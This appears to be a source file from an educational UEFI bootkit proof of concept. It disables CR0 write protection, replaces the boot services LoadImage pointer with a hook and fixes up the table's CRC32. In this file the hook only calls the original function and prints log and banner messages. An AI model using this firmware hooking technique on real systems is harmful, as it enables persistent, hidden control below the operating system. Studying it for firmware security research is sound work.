/** @file
    Hook Functions
**/



// Includes
#include <Uefi.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiLib.h>
#include <Library/SynchronizationLib.h>
#include <Protocol/LoadedImage.h>



// Original gBS->LoadImage pointer
EFI_IMAGE_LOAD OriginalgBSLoadImage = NULL;



/**
    Hook a service table pointer, replacing its original function with a new one.

    This function modifies an entry in the EFI service table. It replaces the existing function pointed to by ServiceTableFunction with a new function provided by NewFunction. Additionally, it returns the address of the original function to allow for later restoration if needed.

    @param[in] ServiceTableHeader    		A pointer to the EFI service table header. This header is updated as part of the hooking process.
    @param[in, out] ServiceTableFunction    A double reference to the EFI service table function. This argument is expected to point to the function to be replaced.
    @param[in] NewFunction           		A pointer to the new function that will replace the existing function in the EFI service table.

    @retval VOID*    Returns a pointer to the original function that was in the service table before the modification. This allows callers to save the original function for later use, for example, to undo the hook.
**/

VOID*
FunctionsHook_HookServiceTablePointer(
	IN EFI_TABLE_HEADER *ServiceTableHeader,
	IN VOID **ServiceTableFunction,
	IN VOID *NewFunction
	)
{
    // Set the console text output color
    gST->ConOut->SetAttribute(gST->ConOut, EFI_LIGHTRED | EFI_BACKGROUND_BLACK);


	// Hello World
    Print(L"AbismoDriverDXERuntime [FunctionsHook.c] (HookServiceTablePointer) - Hello World\r\n");


	// Variables
	UINTN CR0_WP = 0x00010000;


	// Read CR0
	Print(L"AbismoDriverDXERuntime [FunctionsHook.c] (HookServiceTablePointer) - Read CR0\r\n");
	UINTN Cr0 = AsmReadCr0(); // https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/Ia32/ReadCr0.c


    // Raise TPL
	Print(L"AbismoDriverDXERuntime [FunctionsHook.c] (HookServiceTablePointer) - Raise TPL\r\n");
    EFI_TPL Tpl = gBS->RaiseTPL(TPL_HIGH_LEVEL); // https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#efi-boot-services-raisetpl


    // Disable Write Protection if set
    if (Cr0 & CR0_WP) {
		Print(L"AbismoDriverDXERuntime [FunctionsHook.c] (HookServiceTablePointer) - Disable write protection\r\n");
        AsmWriteCr0(Cr0 & ~CR0_WP); // https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/Ia32/WriteCr0.c
    }


    // Exchange the service table pointer
	Print(L"AbismoDriverDXERuntime [FunctionsHook.c] (HookServiceTablePointer) - Exchange the service table pointer\r\n");
    VOID* OriginalFunction = InterlockedCompareExchangePointer(ServiceTableFunction, *ServiceTableFunction, NewFunction); // https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseSynchronizationLib/SynchronizationGcc.c


    // Update CRC32 in the service table header
	Print(L"AbismoDriverDXERuntime [FunctionsHook.c] (HookServiceTablePointer) - Update CRC32 in the service table header\r\n");
    ServiceTableHeader->CRC32 = 0;
    gBS->CalculateCrc32((UINT8*)ServiceTableHeader, ServiceTableHeader->HeaderSize, &ServiceTableHeader->CRC32); // https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#efi-boot-services-calculatecrc32


    // Restore CR0
    if (Cr0 & CR0_WP) {
		Print(L"AbismoDriverDXERuntime [FunctionsHook.c] (HookServiceTablePointer) - Restore CR0\r\n");
        AsmWriteCr0(Cr0); // https://github.com/tianocore/edk2/blob/master/MdePkg/Library/BaseLib/Ia32/WriteCr0.c
    }


	// Restore TPL
	Print(L"AbismoDriverDXERuntime [FunctionsHook.c] (HookServiceTablePointer) - Restore TPL\r\n");
    gBS->RestoreTPL(Tpl); // https://uefi.org/specs/UEFI/2.10/07_Services_Boot_Services.html#efi-boot-services-restoretpl


	// Bye
    Print(L"AbismoDriverDXERuntime [FunctionsHook.c] (HookServiceTablePointer) - Bye\r\n");
    return OriginalFunction;
}



/**
  Hooks and processes the Boot Service's LoadImage function.

  This function serves as a custom hook for UEFI's LoadImage function. It performs additional processing and logging before calling the original LoadImage function.

  @param[in] BootPolicy            Indicates the policy for loading the image. If TRUE, the image is loaded as a boot option; otherwise, it is loaded without boot option.
  @param[in] ParentImageHandle     The handle of the image that is loading this image.
  @param[in] DevicePath            The pointer to the device path of the image.
  @param[in] SourceBuffer          If not NULL, a pointer to the memory location containing a copy of the image to be loaded.
  @param[in] SourceSize            The size in bytes of SourceBuffer.
  @param[out] ImageHandle          The pointer where the handle of the loaded image will be returned.

  @retval EFI_SUCCESS              The image is successfully loaded.
  @retval EFI_NOT_FOUND            The specified file path was not found.
  @retval EFI_INVALID_PARAMETER    One of the parameters is invalid.
  @retval other                    An error occurred during the execution of the LoadImage function.
**/

EFI_STATUS
EFIAPI
FunctionsHook_HookedgBSLoadImage(
	IN BOOLEAN BootPolicy,
	IN EFI_HANDLE ParentImageHandle,
	IN EFI_DEVICE_PATH_PROTOCOL *DevicePath,
	IN VOID *SourceBuffer OPTIONAL,
	IN UINTN SourceSize,
	OUT EFI_HANDLE *ImageHandle
	)
{
    // Set the console text output color
    gST->ConOut->SetAttribute(gST->ConOut, EFI_LIGHTRED | EFI_BACKGROUND_BLACK);


	// Hello World
    Print(L"AbismoDriverDXERuntime [FunctionsHook.c] (HookedgBSLoadImage) - Hello World\r\n");


	// Variables
	EFI_STATUS Status;


    // Call the original LoadImage function
	Print(L"AbismoDriverDXERuntime [FunctionsHook.c] (HookedgBSLoadImage) - Call the original LoadImage function\r\n");
    Status = OriginalgBSLoadImage(BootPolicy, ParentImageHandle, DevicePath, SourceBuffer, SourceSize, ImageHandle);


    // V0.1
    Print(L"AbismoBootkitPkg V0.1 - Visit https://github.com/TheMalwareGuardian/Awesome-Bootkits-Rootkits-Development\r\n");


	// Bye
    Print(L"AbismoDriverDXERuntime [FunctionsHook.c] (HookedgBSLoadImage) - Bye\r\n");
    return Status;
}
